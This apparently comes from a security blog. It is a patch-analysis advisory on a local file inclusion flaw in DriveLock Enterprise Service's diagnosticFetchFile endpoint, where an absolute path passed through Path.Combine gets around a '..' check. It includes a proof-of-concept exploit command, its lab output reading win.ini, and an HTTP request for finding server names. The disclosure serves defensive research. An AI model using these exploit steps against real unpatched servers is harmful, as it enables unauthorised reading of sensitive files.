@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Local File Inclusion, diagnosticFetchFile | Red vs. Blue Shell</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Local File Inclusion, diagnosticFetchFile" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Product description The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside. This means you are secure at the centre, with all paths of access to your sensitive data blocked." />
+<meta property="og:description" content="Product description The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside. This means you are secure at the centre, with all paths of access to your sensitive data blocked." />
+<link rel="canonical" href="/patch%20analysis/2026/03/01/dl-DES-LFI-diagnosticFetchFile.html" />
+<meta property="og:url" content="/patch%20analysis/2026/03/01/dl-DES-LFI-diagnosticFetchFile.html" />
+<meta property="og:site_name" content="Red vs. Blue Shell" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-03-01T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Local File Inclusion, diagnosticFetchFile" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-03-01T00:00:00+00:00","datePublished":"2026-03-01T00:00:00+00:00","description":"Product description The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside. This means you are secure at the centre, with all paths of access to your sensitive data blocked.","headline":"[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Local File Inclusion, diagnosticFetchFile","mainEntityOfPage":{"@type":"WebPage","@id":"/patch%20analysis/2026/03/01/dl-DES-LFI-diagnosticFetchFile.html"},"url":"/patch%20analysis/2026/03/01/dl-DES-LFI-diagnosticFetchFile.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link id="main-stylesheet" rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Red vs. Blue Shell" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Red vs. Blue Shell</a>
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon"></span>
+        </label>
+
+        <div class="nav-items">
+  <a class="nav-item" href="/about/">About</a>
+</div>
+
+      </nav>
+  </div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Local File Inclusion, diagnosticFetchFile</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2026-03-01T00:00:00+00:00" itemprop="datePublished">Mar 1, 2026
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody"><p class="advisory-details">
+
+<table>
+    <tr>
+        <th>Product:</th>
+        <th>DriveLock</th>
+    </tr>
+    <tr>
+        <th>Homepage:</th>
+        <th><a href="https://www.drivelock.com/">https://www.drivelock.com/</a></th>
+    </tr>
+
+
+    <tr>
+        <th>CVE Number:</th>
+        <th><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=ToDo">ToDo</a></th>
+    </tr>
+
+
+    
+    <tr>
+        <th>Vulnerable version:</th>
+        <th>< 25.2.4, < 25.1.7, < 24.2.9</th>
+    </tr>
+    <tr>
+        <th>Fixed version:</th>
+        <th>25.2.4, 25.1.7, 24.2.9</th>
+    </tr>
+    <tr>
+        <th>CVSS Score:</th>
+        <th><span class="MEDIUM">MEDIUM 4.9</span> - <a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N">CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N</a>
+        </th>
+    </tr>
+    <tr>
+        <th>Found:</th><th>Feb 27, 2026</th>
+    </tr>
+</table>
+
+</p>
+
+Back to: <a href="/advisory/2026/03/02/drivelock-patch-analysis.html">[PatchAnalysis - DriveLock] DriveLock Enterprise Service 25.2.4 hidden vulnerabilites </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h1 id="product-description">Product description</h1>
+<blockquote>
+  <p>The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside.
+This means you are secure at the centre, with all paths of access to your sensitive data blocked.</p>
+</blockquote>
+
+<p><em>Cite: <a href="https://www.drivelock.com/en/">DriveLock - Homepage</a></em></p>
+
+<p>This platform includes the <code class="language-plaintext highlighter-rouge">DriveLock Core</code> component, which is an agent installed on the client machines.</p>
+
+<h1 id="overview">Overview</h1>
+<p>It is possible to download any file from the servers filesystem as a logon user with <code class="language-plaintext highlighter-rouge">Infrastructure_Manage</code> permissions. The server does not properly validate the user provided input.</p>
+
+<p><strong>Privileges Required</strong></p>
+<ul>
+  <li>User required: <code class="language-plaintext highlighter-rouge">true</code></li>
+  <li>Permission: <code class="language-plaintext highlighter-rouge">PermissionType.Infrastructure_Manage</code></li>
+</ul>
+
+<h2 id="impact">Impact</h2>
+<p>An attacker can access sensitive data stored on the servers filesystem.</p>
+
+<h1 id="root-cause-analysis">Root Cause Analysis</h1>
+<p>The endpoint <code class="language-plaintext highlighter-rouge">/api/administration/infrastructure/diagnosticFetchFile</code> accepts different path parameters. One of them is the <code class="language-plaintext highlighter-rouge">subFolderAndFile</code> parameter, which is used to build the full path of the file to download.</p>
+
+<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// FILE - DriveLock.EnterpriseServer.ServiceBroker/DriveLock.EnterpriseServer.ServiceBroker/DiagnosticFileHandling.cs</span>
+<span class="n">FUNCTION</span> <span class="nf">FetchFile</span><span class="p">(</span><span class="n">OUT</span> <span class="n">data</span><span class="p">,</span> <span class="n">folderId</span><span class="p">,</span> <span class="n">pathAndFile</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">count</span><span class="p">):</span>
+
+    <span class="c1">// 1. Resolve known folder</span>
+    <span class="n">knownFolder</span> <span class="p">=</span> <span class="nf">GetKnownFolder</span><span class="p">(</span><span class="n">folderId</span><span class="p">)</span>
+    <span class="n">IF</span> <span class="n">knownFolder</span> <span class="n">IS</span> <span class="n">NULL</span> <span class="n">OR</span> <span class="n">EMPTY</span> <span class="n">THEN</span>
+        <span class="n">data</span> <span class="p">=</span> <span class="n">NULL</span>
+        <span class="n">RETURN</span> <span class="nf">Result</span><span class="p">(</span><span class="k">false</span><span class="p">,</span> <span class="s">"Unknown folder"</span><span class="p">)</span>
+    <span class="n">END</span> <span class="n">IF</span>
+    <span class="c1">// 2. Prevent path traversal</span>
+    <span class="n">IF</span> <span class="n">pathAndFile</span> <span class="n">CONTAINS</span> <span class="s">".."</span> <span class="n">THEN</span>
+        <span class="n">data</span> <span class="p">=</span> <span class="n">NULL</span>
+        <span class="n">RETURN</span> <span class="nf">Result</span><span class="p">(</span><span class="k">false</span><span class="p">,</span> <span class="s">"Not allowed subfolder"</span><span class="p">)</span>
+    <span class="n">END</span> <span class="n">IF</span>
+    <span class="c1">// 3. Handle empty read request</span>
+    <span class="n">IF</span> <span class="n">count</span> <span class="p">==</span> <span class="m">0</span> <span class="n">THEN</span>
+        <span class="n">data</span> <span class="p">=</span> <span class="n">NEW</span> <span class="nf">BYTE_ARRAY</span><span class="p">(</span><span class="n">size</span> <span class="p">=</span> <span class="m">0</span><span class="p">)</span>
+        <span class="n">RETURN</span> <span class="nf">Result</span><span class="p">(</span><span class="k">true</span><span class="p">)</span>
+    <span class="n">END</span> <span class="n">IF</span>
+
+    <span class="n">TRY</span>
+        <span class="c1">// 4. Build full file path</span>
+        <span class="n">fullPath</span> <span class="p">=</span> <span class="nf">CombinePath</span><span class="p">(</span><span class="n">knownFolder</span><span class="p">,</span> <span class="n">pathAndFile</span><span class="p">)</span>
+        <span class="c1">// 5. Ensure file exists</span>
+        <span class="n">IF</span> <span class="nf">FileExists</span><span class="p">(</span><span class="n">fullPath</span><span class="p">)</span> <span class="n">IS</span> <span class="n">FALSE</span> <span class="n">THEN</span>
+            <span class="n">data</span> <span class="p">=</span> <span class="n">NULL</span>
+            <span class="n">RETURN</span> <span class="nf">Result</span><span class="p">(</span><span class="k">false</span><span class="p">,</span> <span class="s">"File '"</span> <span class="p">+</span> <span class="n">fullPath</span> <span class="p">+</span> <span class="s">"' does not exist"</span><span class="p">)</span>
+        <span class="n">END</span> <span class="n">IF</span>
+        <span class="n">data</span> <span class="p">=</span> <span class="nf">ReadBytesFromFile</span><span class="p">(</span><span class="n">fullPath</span><span class="p">,</span> <span class="n">startPosition</span> <span class="p">=</span> <span class="n">pos</span><span class="p">,</span> <span class="n">length</span> <span class="p">=</span> <span class="n">count</span><span class="p">)</span>
+
+    <span class="n">RETURN</span> <span class="nf">Result</span><span class="p">(</span><span class="k">true</span><span class="p">)</span>
+<span class="n">END</span> <span class="n">FUNCTION</span>
+
+</code></pre></div></div>
+
+<p>As shown above the <code class="language-plaintext highlighter-rouge">pathAndFile</code> (<code class="language-plaintext highlighter-rouge">subFolderAndFile</code> in the route definition) parameter is validated and a check is performed that it does not include <code class="language-plaintext highlighter-rouge">..</code>  to move up to a parent directory. Thus the value <code class="language-plaintext highlighter-rouge">./../../../../windows/win.ini</code> would be rejected. But it does not test if the provided path is a full qualified path like <code class="language-plaintext highlighter-rouge">C:\windows\win.ini</code>.</p>
+
+<p>This lack of validation can be exploit, because the function <code class="language-plaintext highlighter-rouge">Path.Combine</code> is used to construct the full path - <code class="language-plaintext highlighter-rouge">string text = Path.Combine(knownFolder, pathAndFile);</code>.</p>
+
+<p>As the documentation states:</p>
+
+<blockquote>
+  <p><strong>Important</strong>
+This method assumes that the first argument is an absolute path and that the following argument or arguments are relative paths. If this is not the case, and particularly if any subsequent arguments are strings input by the user, call the Join or TryJoin method instead.</p>
+</blockquote>
+
+<p><strong>CITE: https://learn.microsoft.com/en-us/dotnet/api/system.io.path.combine?view=net-10.0</strong></p>
+
+<p>if any of the parts is absolute, this is used as the new base.</p>
+
+<p>For example:</p>
+<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="s">"C:\\temp\\foobar"</span><span class="p">,</span> <span class="s">"message.txt"</span><span class="p">);</span> <span class="c1">// --&gt; C:\temp\foobar\message.txt</span>
+<span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="s">"C:\\temp\\foobar"</span><span class="p">,</span> <span class="s">"C:\\windows\\message.txt"</span><span class="p">);</span> <span class="c1">// --&gt; C:\\windows\\message.txt</span>
+</code></pre></div></div>
+
+<h1 id="proof-of-concept--exploit">Proof of Concept / Exploit</h1>
+<p>Setup <code class="language-plaintext highlighter-rouge">JWT</code>, <code class="language-plaintext highlighter-rouge">DES_NAME</code> environment var and run the included <a href="/assets/drivelock/poc/poc-lfi-webUI-diagnosticFetchFile.sh">PoC - webUI-diagnosticFetchFile</a>:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">export </span><span class="nv">JWT</span><span class="o">=</span><span class="s2">"XXX"</span>
+❯ <span class="nb">export </span><span class="nv">DES_NAME</span><span class="o">=</span><span class="s2">"XXX"</span>
+❯ ./poc-lfi-webUI-diagnosticFetchFile.sh
+</code></pre></div></div>
+
+<h2 id="exploit">Exploit</h2>
+<p>The following demonstrates the usage of the exploit suite:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ uv run <span class="nt">-m</span> drivelock.exploit <span class="nt">-t</span> doetess <span class="nt">-u</span> stuxxn <span class="nt">-P</span> <span class="s1">'!23456Qwertz'</span> lfi diagnosticFetchFile packer-win2019.pentest.lab <span class="s1">'C:/windows/win.ini'</span>
+<span class="o">[</span>INFO] URL: https://des-25-2-2.pentest.lab:4568/api/administration/auth/login
+<span class="o">[</span>INFO] Login as - tenant: doetess, user: stuxxn
+<span class="o">[</span>INFO] Setup JWT <span class="k">for </span>http.client
+<span class="o">[</span>DEBUG] Token: XXX
+<span class="o">[</span>INFO] Trying to download file: C:<span class="se">\w</span>indows<span class="se">\w</span><span class="k">in</span>.ini
+<span class="o">[</span>INFO] URL: https://des-25-2-2.pentest.lab:4568/api/administration/infrastructure/diagnosticFetchFile/packer-win2019.pentest.lab/1/C:<span class="se">\w</span>indows<span class="se">\w</span><span class="k">in</span>.ini/5242880
+File content:
+b<span class="s1">'; for 16-bit app support\r\n[fonts]\r\n[extensions]\r\n[mci extensions]\r\n[files]\r\n[Mail]\r\nMAPI=1\r\n'</span>
+
+</code></pre></div></div>
+
+<p>To get the <code class="language-plaintext highlighter-rouge">DES</code> name, required for the exploit, use the <code class="language-plaintext highlighter-rouge">/api/administration/infrastructure/listDes</code> endpoint.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/administration/infrastructure/listDes</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">192.168.60.10:4568</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/plain, */*</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate, br</span>
+<span class="na">Authorization</span><span class="p">:</span> <span class="s">Bearer XXX</span>
+<span class="na">Lang</span><span class="p">:</span> <span class="s">en</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">https://192.168.60.10:4568</span>
+<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">empty</span>
+<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">cors</span>
+<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Priority</span><span class="p">:</span> <span class="s">u=0</span>
+<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+
+</code></pre></div></div>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"servers"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"desName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"packer-win2019.pentest.lab"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"desType"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"httpAddress"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://packer-win2019.pentest.lab:6067"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"tenant"</span><span class="p">:</span><span class="w"> </span><span class="s2">"root"</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h1 id="solution">Solution</h1>
+<p>Patch for version 25.2, 25.1 and 24.2 were published on 2026-02-20, which fixes the vulnerability.
+Patched versions:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>25.2.4
+25.1.7
+24.2.9
+</code></pre></div></div>
+
+<p>No other mitigations are known.</p>
+
+
+  </div>
+
+  <a class="u-url" href="/patch%20analysis/2026/03/01/dl-DES-LFI-diagnosticFetchFile.html" hidden></a>
+</article>
+
+      </div>
+    </main><link id="fa-stylesheet" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.0.0/css/all.min.css">
+
+<footer class="site-footer h-card">
+  <data class="u-url" value="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+      </div>
+      <div class="footer-col">
+        <p>Posts about IT Security, pentesting and bug bounty hunting.</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+    <a rel="me" href="" target="_blank" title="">
+      <span class="grey fa-brands fa- fa-lg"></span>
+    </a>
+  </li><li>
+    <a rel="me" href="" target="_blank" title="">
+      <span class="grey fa-brands fa- fa-lg"></span>
+    </a>
+  </li>
+  <li>
+    <a href="/feed.xml" target="_blank" title="Subscribe to syndication feed">
+      <svg class="svg-icon grey" viewbox="0 0 16 16">
+        <path d="M12.8 16C12.8 8.978 7.022 3.2 0 3.2V0c8.777 0 16 7.223 16 16h-3.2zM2.194
+          11.61c1.21 0 2.195.985 2.195 2.196 0 1.21-.99 2.194-2.2 2.194C.98 16 0 15.017 0
+          13.806c0-1.21.983-2.195 2.194-2.195zM10.606
+          16h-3.11c0-4.113-3.383-7.497-7.496-7.497v-3.11c5.818 0 10.606 4.79 10.606 10.607z"
+        />
+      </svg>
+    </a>
+  </li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+
+</body>
+
+</html>
